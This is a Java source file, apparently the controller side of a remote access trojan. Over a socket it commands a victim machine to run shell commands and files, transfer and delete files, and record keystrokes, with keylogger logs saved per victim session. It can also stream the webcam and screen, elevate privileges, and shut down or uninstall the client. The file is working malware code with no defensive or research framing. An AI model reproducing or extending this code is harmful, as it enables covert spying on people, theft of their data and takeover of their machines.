package Connections;


import GUI.TableUtils.Connection.Connection;
import GUI.TableUtils.KeyLogger.KeyloggerEvents;
import GUI.TableUtils.Permissions.Permissions;
import GUI.TableUtils.ReverseShell.Shell;
import GUI.TableUtils.ScreenStreaming.Screen;
import GUI.TableUtils.SystemState.State;
import Information.*;

import Information.Action;
import org.json.JSONObject;


import javax.swing.*;
import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class Streams {

    private final DataInputStream dis;
    private final DataOutputStream dos;
    private SystemInformation tempSystemInformation;
    private NetworkInformation tempNetworkInformation;
    private boolean webcamDialogOpen;

    private final Socket clientSocket;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public Streams(Socket socket) throws IOException {
        if (socket == null) throw new IllegalArgumentException();
        clientSocket = socket;
        InputStream is = socket.getInputStream();
        OutputStream os = socket.getOutputStream();
        dis = new DataInputStream(is);
        dos = new DataOutputStream(os);
    }

    public byte[] receiveBytes() throws IOException {
        int fileSize = readSize();
        int total = 0;
        byte[] buffer = new byte[fileSize];
        // System.out.println("buffer size -> " + buffer.length);
        try {
            while (total < fileSize) {
                int read = dis.read(buffer, total, fileSize - total);
                total += read;
            }
            //System.out.println("REAL TOTAL -> " + total);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

//        System.out.println(total);

        return buffer;
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public void receiveFile(String path) throws IOException {
        String fileName = readString();
        File filePath = new File(path + "\\" + fileName);
        filePath.getParentFile().mkdirs();

        boolean resultOfCreation = filePath.createNewFile();

        System.out.println(resultOfCreation);
        System.out.println("Name " + filePath);

        sendSize(-70);
        int fileSize = readSize();
        int read;
        int total = 0;
        byte[] buffer = new byte[1024];
        FileOutputStream fos;

        fos = new FileOutputStream(filePath);

        BufferedOutputStream bos = new BufferedOutputStream(fos);
        while (total < fileSize) {
            try {
                read = dis.read(buffer);
                total += read;
                bos.write(buffer, 0, read);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

            System.out.println(total);
        }

        bos.flush();
        bos.close();


        System.out.println("File "
                + " downloaded (" + total + " bytes read)");

    }


    private SystemInformation listToSystemInformation(List<String> list) {
        return new SystemInformation(list.get(0), list.get(1), list.get(2), list.get(3),
                list.get(4), list.get(5), list.get(6),Boolean.parseBoolean(list.get(7)),Boolean.parseBoolean(list.get(8)));
    }

    private NetworkInformation listToNetworkInformation(String jsonString) {
        JSONObject jsonObject = new JSONObject(jsonString);
        return new NetworkInformation(
                jsonObject.get("query").toString(),
                jsonObject.get("isp").toString(),
                jsonObject.get("continent").toString(),
                jsonObject.get("country").toString(),
                jsonObject.get("regionName").toString(),
                jsonObject.get("city").toString(),
                jsonObject.get("timezone").toString(),
                jsonObject.get("currency").toString(),
                jsonObject.getBoolean("proxy")
        );
    }

    public Object sendAction(Action action) throws IOException {
        switch (action) {
            case SYS_INFO -> {
                sendSize(0);
                List<String> informationList = readList();
                return listToSystemInformation(informationList);
            }
            case NET_INFO -> {
                sendSize(1);
                String networkJSON = readString();
                return listToNetworkInformation(networkJSON);
            }
            case DISK -> {
                sendSize(2);
                System.out.println();
                List<String> listOfDisks = readList();
                System.out.println(listOfDisks);
                return listOfDisks.toArray(new String[0]);
            }
            case REQUEST_WEBCAM -> {
                sendSize(16);
                return readList();
            }

        }
        return null;
    }

    public void sendAction(Action action, String destinationPath, int length) throws IOException {
        if (action == Action.UPLOAD) {
            sendSize(10);
            sendString(destinationPath);
            sendSize(length);
        }
    }

    public void sendAction(Action action, List<String> fileList, List<String> directoryList) throws IOException {
        if (action == Action.COPY) {
            sendSize(6);
            sendList(fileList);
            sendList(directoryList);
        }
    }

    public void sendAction(Action action, List<String> fileList, String directory) throws IOException {
        if (action == Action.MOVE) {
            sendSize(7);
            sendList(fileList);
            sendString(directory);
        }
    }

    public List<String> sendAndReadAction(Action action, String name) throws IOException {
        if (action == Action.R_A_DIR) {
            sendSize(3);
            sendString(name);
            return new ArrayList<>(Arrays.asList(readString().split("\\|")));
        }
        return null;
    }

    public String sendAndReadAction(Shell action, String command) throws IOException {
        if (action == Shell.COMMAND) {
            sendSize(11);
            sendString(command);
            return readString();
        }
        return null;
    }

    public void sendAction(Action action, String command) throws IOException {
        switch (action) {
            case KEYBOARD_COMMAND -> {
                sendSize(18);
                sendString(command);
            }
            case BOX_MESSAGE -> {
                sendSize(21);
                sendString(command);
            }

        }
    }

    public Object sendAndReadAction(Action action, String selectedDevice, boolean fragmented, int fps) throws IOException {
        if (action == Action.START_WEBCAM) {
            sendSize(17);
            sendString(selectedDevice);
            sendSize(fragmented ? 1 : 0);
            sendSize(fps);
            return new int[]{readSize(), readSize()};
        }
        return null;
    }


    public void sendAction(Action action, List<String> fileList) throws IOException {
        switch (action) {
            case DOWNLOAD -> {
                sendSize(5);
                sendList(fileList);
            }
            case DELETE -> {
                sendSize(8);
                sendList(fileList);
            }
            case RUN -> {
                sendSize(9);
                sendList(fileList);
            }
        }
    }

    public void sendAction(KeyloggerEvents event) throws IOException {
        String nameOfSession = getSessionFolder() + "/" + "/KeyLogger Logs/" + new Time().getTime();
        switch (event) {
            case START -> sendSize(12);
            case STOP -> sendSize(13);
            case DUMP_LAST -> {
                sendSize(4);
                if (readSize()!=-1) {
                    receiveFile(nameOfSession);
                    FolderOpener.open(nameOfSession);
                } else {
                    noLogsToDownload();
                }
            }
            case DUMP_ALL -> {
                sendSize(14);
                if (readSize()!=-1) {
                    receiveLogs(nameOfSession);
                    FolderOpener.open(nameOfSession);
                } else {
                    noLogsToDownload();
                }
            }
        }
    }

    private void noLogsToDownload (){
        SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "There are no logs to download!",
                "Keylogger error", JOptionPane.ERROR_MESSAGE));
    }

    private void receiveLogs(String nameOfSession) throws IOException {
        while (readSize()!=-1){
            receiveFile(nameOfSession);
            sendSize(0);
        }
    }

    public boolean sendAndReadAction(KeyloggerEvents event) throws IOException {
        switch (event) {
            case STATE -> {
                sendSize(15);
                return (readSize() != 0);
            }
            case CHECK_LAST -> {
                sendSize(1403);
                return (readSize() != 0);
            }
            case CHECK_ALL -> {
                sendSize(1404);
                return (readSize()!=0);
            }
        }
        return false;
    }

    public int sendAndReadAction(Permissions permissions) throws IOException {
        switch (permissions) {
            case IS_ADMIN -> {
                sendSize(19);
                return readSize();
            }
            case ELEVATE_PRIVILEGES -> {
                sendSize(20);
                return readSize();
            }

        }
        return 0;
    }

    public void sendAction(Screen action) throws IOException {
        if (action == Screen.STREAM) {
            sendSize(22);
        }
    }


    public void sendAction(Connection action) throws IOException {
        switch (action) {
            case RESTART -> sendSize(-1);
            case DISCONNECT -> sendSize(-2);
            case UNINSTALL -> sendSize(-3);
        }
    }

    public void stateAction(State state) throws IOException {
        switch (state) {
            case LOG_OFF -> sendSize(23);
            case SHUTDOWN -> sendSize(24);
            case REBOOT -> sendSize(25);
        }
    }



    public void sendList(List<String> fileList) throws IOException {
        String convertedListWithSeparator = String.join("|", fileList);
        sendString(convertedListWithSeparator);

    }

    public List<String> readList() throws IOException {
        String stringList = readString();
        return new ArrayList<>(Arrays.asList(stringList.split("\\|")));
    }

    public void sendSize(int size) throws IOException {
        dos.writeInt(size);
    }

    public void sendString(String message) throws IOException {
        byte[] buffer = message.getBytes();
        sendSize(buffer.length);
        dos.write(buffer);
    }

    public int readSize() throws IOException {
        return dis.readInt();
    }

    public String readString() throws IOException {
        int size = readSize();
        byte[] buffer = new byte[size];
        int read = 0;
        while (read < size) {
            read += dis.read(buffer, 0, size);
        }
        return new String(buffer);
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    public String getSessionFolder() {
        return "Session - " + getIdentifier();
    }

    public String getIdentifier() {
        return tempNetworkInformation.IP() + " - " + tempSystemInformation.USER_NAME();
    }

    public SystemInformation getTempSystemInformation() {
        return tempSystemInformation;
    }

    public void setTempSystemInformation(SystemInformation tempSystemInformation) {
        this.tempSystemInformation = tempSystemInformation;
    }

    public NetworkInformation getTempNetworkInformation() {
        return tempNetworkInformation;
    }

    public void setTempNetworkInformation(NetworkInformation tempNetworkInformation) {
        this.tempNetworkInformation = tempNetworkInformation;
    }

    public boolean isWebcamDialogOpen() {
        return !webcamDialogOpen;
    }

    public void setWebcamDialogOpen(boolean webcamDialogOpen) {
        this.webcamDialogOpen = webcamDialogOpen;
    }

    public ExecutorService getExecutor() {
        return executor;
    }

    public DataOutputStream getDos() {
        return dos;
    }

    public DataInputStream getDis() {
        return dis;
    }


}